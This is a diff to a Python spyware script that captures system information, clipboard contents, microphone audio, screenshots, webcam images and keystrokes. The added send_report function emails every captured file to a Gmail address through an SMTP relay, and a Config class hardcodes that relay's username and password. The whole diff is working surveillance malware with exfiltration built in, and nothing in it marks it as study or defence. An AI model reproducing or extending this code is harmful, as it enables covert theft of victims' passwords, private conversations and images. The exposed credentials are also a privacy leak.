@@ -6,12 +6,13 @@ try:
     from email.mime.multipart import MIMEMultipart
     from email.mime.text import MIMEText
     from email.mime.base import MIMEBase
+    from email.mime.application import MIMEApplication
     from email import encoders
     import smtplib
     import socket
     import platform
     import win32clipboard
-    from pynput.keyboard import Key, Listener
+    import pynput.keyboard as keyboard
     import time
     import os
     from scipy.io.wavfile import write
@@ -20,7 +21,6 @@ try:
     from requests import get
     from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
     from PIL import ImageGrab
-    import keyboard
     import datetime
     from functools import partial
     from urllib import request
@@ -28,8 +28,17 @@ try:
     import json
     import ctypes
     import threading
+    from threading import Timer
 except:
     os.system("pip install -r requirements.txt")
+
+class Config:
+   SEND_REPORT_EVERY = 30  # in seconds
+   EMAIL_ADDRESS = "it.c0nt1n3ntal@gmail.com"
+   SMTP_SERVER = "smtp.mailersend.net"
+   SMTP_PORT = 587
+   SMTP_USERNAME = "MS_yA4y9Q@trial-3yxj6ljpew0ldo2r.mlsender.net"
+   SMTP_PASSWORD = "oFENPhUJMs7TOQAf"
 
 # Global Variables
 cwd = os.path.join(os.getcwd(), 'out')
@@ -37,17 +46,12 @@ cwd = os.path.join(os.getcwd(), 'out')
 if (os.path.isdir(cwd) is not True): os.mkdir(cwd, 0o666)
 
 dt = str(datetime.datetime.now().strftime("%Y%m%d_%H%M%S"))
-keys_info = os.path.join(cwd, "key_log_" + dt + ".txt")
 system_info = os.path.join(cwd, "systeminfo_" + dt + ".txt")
 clipboard_info = os.path.join(cwd,"clipboard_" + dt + ".txt")
 audio_info = os.path.join(cwd, "audio_" + dt + ".wav")
 screenshot_info = os.path.join(cwd, "screenshot_" + dt + ".png")
 webCamShot_info = os.path.join(cwd, "webCamera_" + dt + ".png")
-keystrokes_info = os.path.join(cwd, "keystrokes" + dt + ".log")
-
-keys_info_e = os.path.join(cwd, "e_key_log_" + dt + ".txt")
-system_info_e = os.path.join(cwd, "e_systeminfo_" + dt + ".txt")
-clipboard_info_e = os.path.join(cwd, "e_clipboard_" + dt + ".txt")
+keystrokes_info = os.path.join(cwd, "keystrokes_" + dt + ".log")
 
 microphone_time = 10
 time_iteration = 15
@@ -61,58 +65,49 @@ MAP = {
 }
 
 TERMINATE_KEY = "f7"
-TIMER_DURATION = 30  # Time in seconds (e.g., 60 seconds)
+TIMER_DURATION = 10  # Time in seconds (e.g., 60 seconds)
 
-def callback(output, is_down, event):
-    if event.event_type in ("up", "down"):
-        key = MAP.get(event.name, event.name)
-        modifier = len(key) > 1
-        # Capture only modifiers when keys are pressed
-        if not modifier and event.event_type == "down": return
-        # Avoid typing the same key multiple times if it is being pressed
-        if modifier:  
-            if event.event_type == "down":
-                if is_down.get(key, False): return
-                is_down[key] = True
-            elif event.event_type == "up": is_down[key] = False
-            key = " [{} ({})] ".format(key, event.event_type)  # Indicate if the key is being pressed
-        # Line break
-        elif key == "\r": key = "\n"  
-        output.write(key)  # Write the key to the output file
-        output.flush()  # Force write
+class Keylogger:
+    def __init__(self, time_interval, debug=False):
+        self.log = ""
+        self.interval = time_interval
+        self.debug = debug
+        self.timer = Timer(self.interval, self.stop)
+        self.listener = keyboard.Listener(on_press=self.on_press)
 
-def onexit(output):
-    output.close()
+    def on_press(self, key):
+        # if self.debug: print('on_press')
+        try:
+            self.log += key.char
+        except AttributeError:
+            self.log += f" [{key}] "
 
-def timer_termination():
-    print(f"Keylogger will stop in {TIMER_DURATION} seconds...")
-    time.sleep(TIMER_DURATION)
-    print("Timer expired. Stopping keylogger.")
-    keyboard.unhook_all()  # Unhook all keyboard events to stop the keylogger
-
-def key_logger():
-    print('Starting system information...')
-    print("Press F7 to terminate or wait for the timer to expire.")
-    try:
-        is_down = {}  # Indicates if a key is being pressed
-        output = open(keystrokes_info, 'a')  # Output file
-        atexit.register(onexit, output)  # Close the file at the end of the program
-
-        # Start the keylogger hook
-        keyboard.hook(partial(callback, output, is_down))
+    def report(self):
+        if self.log != "":
+            if self.debug: print('report')
+            with open(keystrokes_info, '+x') as f: f.write(self.log)
+            self.log = ""
+            self.listener.stop()
+            self.timer.cancel()
+            return
         
-        # Start the timer in a separate thread
-        timer_thread = threading.Thread(target=timer_termination)
-        timer_thread.daemon = True  # Ensure thread terminates when main thread exits
-        timer_thread.start()
-        
-        # Wait for the terminate key (F7) to be pressed
-        keyboard.wait(TERMINATE_KEY)
-        print("Terminate key pressed. Stopping keylogger.")
-        keyboard.unhook_all()  # Unhook all keyboard events to stop the keylogger
-        
-    except PermissionError:
-        print("File is probably being used by another process.")
+        self.timer = Timer(self.interval, self.report)
+        self.timer.start()
+
+    def start(self):
+        if self.debug: print('start')
+        self.listener.start()
+        self.report()
+        self.listener.join()
+
+    def stop(self):
+        self.listener.stop()
+        self.timer.cancel()
+        return
+
+def keys_logger():
+    keylogger = Keylogger(time_interval=TIMER_DURATION, debug=False)
+    keylogger.start()
 
 # Get System Information
 def system_information():
@@ -187,6 +182,29 @@ def set_wallpaper():
     if result: print("Wallpaper changed successfully!")
     else: print("Failed to change wallpaper.")
 
+def send_report():
+    # Creating the Email Object
+    message = MIMEMultipart()
+    message["From"] = Config.SMTP_USERNAME
+    message["To"] = Config.EMAIL_ADDRESS
+    message["Subject"] = f"Report {datetime.datetime.now()}"
+
+    body_part = MIMEText(f"Report {datetime.datetime.now()}")
+    message.attach(body_part)
+
+    files = [system_info, clipboard_info, audio_info, screenshot_info, webCamShot_info, keystrokes_info]
+
+    for file in files:
+        if os.path.isfile(file): 
+            with open(file,'rb') as _file: 
+                message.attach(MIMEApplication(_file.read(), Name=os.path.split(file)[1]))
+
+    with smtplib.SMTP(Config.SMTP_SERVER, Config.SMTP_PORT) as server:
+        server.starttls()
+        server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
+        server.send_message(message)
+        print(f"Email sent at {datetime.datetime.now()}")
+
 def main():
     system_information()
     copy_clipboard()
@@ -194,7 +212,9 @@ def main():
     screenshots()
     web_camera()
     set_wallpaper()
-    key_logger()
+    keys_logger()
+    send_report()
+    return
 
 if __name__ == "__main__":
-  main()
+    main()
